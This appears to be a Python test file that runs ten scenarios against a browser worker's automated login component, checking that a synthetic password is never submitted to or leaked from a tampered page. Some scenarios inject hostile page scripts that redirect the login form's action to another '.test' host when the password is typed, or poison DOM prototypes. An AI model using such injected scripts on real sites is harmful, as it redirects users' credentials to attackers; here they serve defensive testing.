"""Synthetic checks executed against the real Chromium process inside the VM."""
from urllib.parse import parse_qs

from browser_worker.auth import AtomicAuthenticator, Credential, LoginSpec, SUBMIT_CHECKPOINT
from browser_worker.errors import BrowserFailure, Code
from browser_worker.output_gate import OutputGate, Phase
from browser_worker.watchdog import WorkerLease

ORIGIN = "https://app.shadow.test"
PASSWORD = "synthetic-atomic-auth-canary"
SPEC = LoginSpec(url=ORIGIN + "/login", action=ORIGIN + "/session", success=ORIGIN + "/items",
                 username="#username", password="#password", submit="#submit", success_selector="main[data-view=items]")
FORM = '<form action="/session" method="post"><input id="username" name="username"><input id="password" name="password" type="password"><button id="submit" type="submit">Sign in</button></form>'


async def check_scenario(browser, mode):
    lease = WorkerLease()
    lease.renew(sequence=1, ttl_ms=10000)
    gate = OutputGate(lease)
    context = await browser.new_context(accept_downloads=False, service_workers="block")
    page = await context.new_page()
    submissions = []
    resolved = []
    phases = []
    events = []
    page.on("requestfailed", lambda request: events.append(("failed", request.url == SPEC.success, request.failure)))
    page.on("framenavigated", lambda frame: events.append(("navigation", frame.url == SPEC.success)))

    async def route_request(route):
        request = route.request
        if request.url == SPEC.url and request.method == "GET":
            content = FORM
            if mode == "input_mutation":
                content += '<script>document.querySelector("#password").addEventListener("input",()=>document.querySelector("form").action="https://other.shadow.test/session")</script>'
            if mode == "prototype_poison":
                content += '<script>Document.prototype.querySelectorAll = () => []; HTMLFormElement.prototype.requestSubmit = () => {throw Error("synthetic-prototype-canary")}</script>'
            await route.fulfill(status=200, content_type="text/html", body=content)
        elif request.url == SPEC.action and request.method == "POST":
            submissions.append(parse_qs(request.post_data))
            # Playwright intercepts only the first request in an HTTP redirect
            # chain. This in-driver fixture uses a new document navigation;
            # real HTTP redirects need the separate leased HTTPS fixture.
            await route.fulfill(status=200, content_type="text/html", body='<script>location.replace("/items")</script>')
        elif request.url == SPEC.success:
            await route.fulfill(status=200, content_type="text/html", body='<main data-view="items"><h1>Saved items</h1></main>')
        else:
            await route.abort()

    await context.route("**/*", route_request)

    async def resolve():
        assert gate.phase == Phase.RESOLVING
        resolved.append(True)
        if mode == "replace_node":
            await page.evaluate('document.querySelector("#password").outerHTML = \'<input id="password" type="password" name="password">\'')
        return Credential("synthetic-user", PASSWORD)

    async def authorize(stage):
        phases.append(stage)
        assert gate.phase != Phase.READY
        if stage == "fill":
            if mode == "form_action":
                await page.evaluate('document.querySelector("form").action = "https://other.shadow.test/session"')
            if mode == "frame":
                await page.evaluate('document.body.append(document.createElement("iframe"))')
            if mode == "navigation":
                await page.goto(SPEC.success)
            if mode == "revoke":
                lease.revoke()
        if stage == "verify" and mode == "after_submit":
            raise BrowserFailure(Code.LEASE_EXPIRED)
        if stage == "submit" and mode == "submit_mutation":
            await page.evaluate('document.querySelector("#submit").formAction = "https://other.shadow.test/session"')

    class DiagnosticAuth(AtomicAuthenticator):
        async def _evaluate(self, expression):
            try:
                value = await super()._evaluate(expression)
            except Exception as error:
                if expression == SUBMIT_CHECKPOINT:
                    events.append(("submit_exception", type(error).__name__))
                raise
            if expression == SUBMIT_CHECKPOINT:
                events.append(("submit_result", value))
            return value

    auth = DiagnosticAuth(page, gate, SPEC)
    result = await auth.run(resolve, authorize)
    assert PASSWORD not in repr(result)
    assert "synthetic-prototype-canary" not in repr(result)
    assert resolved == [True], (mode, result.state, result.code, phases, events)
    if mode in {"success", "prototype_poison"}:
        assert result.state == "succeeded", (mode, result.state, result.code, phases, len(submissions), events)
        assert gate.phase == Phase.READY
        checkpoint = gate.output_checkpoint(await auth.document())
        gate.validate_output(checkpoint, await auth.document())
        assert len(submissions) == 1
        assert submissions[0] == {"username": ["synthetic-user"], "password": [PASSWORD]}
        assert await page.locator("input").count() == 0
    elif mode == "after_submit":
        assert result.state == "outcome_unknown" and len(submissions) == 1
        assert gate.phase == Phase.CLOSED
    else:
        assert result.state == "failed", (mode, result.state, result.code)
        assert not submissions
        assert gate.phase == Phase.CLOSED
    await context.close()


async def run(browser):
    for mode in ("success", "form_action", "frame", "navigation", "replace_node", "input_mutation", "submit_mutation", "revoke", "after_submit", "prototype_poison"):
        await check_scenario(browser, mode)
    print("BROWSER_ATOMIC_AUTH=pass", flush=True)
    print("BROWSER_AUTH_SCENARIOS=10", flush=True)
